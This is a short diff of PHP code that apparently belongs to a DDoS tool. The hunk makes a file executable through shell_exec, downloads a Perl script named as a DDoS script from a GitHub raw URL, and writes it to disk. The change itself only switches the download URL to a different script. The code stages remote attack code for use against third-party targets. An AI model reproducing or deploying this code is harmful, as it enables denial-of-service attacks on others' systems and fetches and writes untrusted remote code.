@@ -50,7 +50,7 @@
 
 				shell_exec("chmod 755 ".$ddosAdi."");
 
-				$ddosScript = file_get_contents("https://raw.githubusercontent.com/DaykoTEK/raw/main/dayko.pl");
+				$ddosScript = file_get_contents("https://raw.githubusercontent.com/DaykoTEK/raw/main/dn.pl");
 				$dosya = fopen($ddosAdi, 'w');
 
 				fwrite($dosya, $ddosScript);
